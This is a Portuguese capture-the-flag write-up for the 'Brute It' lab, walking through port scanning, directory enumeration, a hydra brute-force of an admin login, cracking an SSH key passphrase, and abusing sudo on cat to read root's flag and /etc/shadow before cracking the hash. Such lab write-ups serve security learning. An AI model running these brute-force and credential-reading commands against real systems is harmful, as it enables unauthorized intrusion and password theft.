# Brute It

* ### Scan de portas - Verificando quais portas estão abertas.
```bash
rustscan -a 10.10.254.47
```
![image](https://github.com/lufffe/Writeups/assets/90646635/1cf6163d-2bd6-4d0a-b0f3-028bd0c2b9bc)

![image](https://github.com/lufffe/Writeups/assets/90646635/d82e94f7-67fb-417d-a8cd-5f30726041c4)

* ### Verificando o que está rodando nas portas encontradas.
```bash
nmap -A -p 22,80 10.10.254.47
```
![image](https://github.com/lufffe/Writeups/assets/90646635/41d74d76-9954-4474-86c8-be5f32c7ad11)

* ### Scan de Arquivos e Diretórios.
```bash
gobuster dir -u http://10.10.254.47 -w ~/directory-list-2.3-small.txt -t 100 --no-error
```
![image](https://github.com/lufffe/Writeups/assets/90646635/a64cdebc-51c2-47a6-a596-8da39b675f35)


* ### Pasta /admin que encontramos no scan de diretorios.
![image](https://github.com/lufffe/Writeups/assets/90646635/62db7cd6-310e-4364-b917-23bcbef6b898)

* ### Brute Force no usuário admin.
```bash
sudo hydra -l admin -P ~/rockyou.txt 10.10.254.47 http-post-form "/admin/index.php:user=admin&pass=^PASS^:F=Username or password invalid" -V
```
![image](https://github.com/lufffe/Writeups/assets/90646635/95af0208-d9eb-4b00-894d-f322af24540f)

* ### Aqui tem a Flag Web, e uma chave ssh privada.
![image](https://github.com/lufffe/Writeups/assets/90646635/0e7bbd9c-2aa0-4953-92f0-b99883eb04a8)

* ### Descobrindo a senha da chave privada.
```bash
/usr/share/john/ssh2john.py id_rsa > hash.txt
```
```bash
john hash.txt -wordlist=~/rockyou.txt
```

* ### Acessando via SSH.
```bash
ssh -i id_rsa john@10.10.254.47
```
![image](https://github.com/lufffe/Writeups/assets/90646635/3b4bd8b2-3d52-4ebe-af59-2a353c68d249)


* ### Flag Usuário.
```bash
cat user.txt
```

* ### Escalando Previlégio.
```bash
sudo -l
```
![image](https://github.com/lufffe/Writeups/assets/90646635/6cc85426-329f-4f1a-9bdb-b9ae869cc3a0)

* ### Flag Root.
```bash
sudo /bin/cat /root/root.txt
```

* ### Pega o hash que está no usuário root.
```bash
sudo /bin/cat /etc/shadow
```

* ### Quebrando o hash.
```bash
hashcat -m 1800 hash ~/rockyou.txt
```

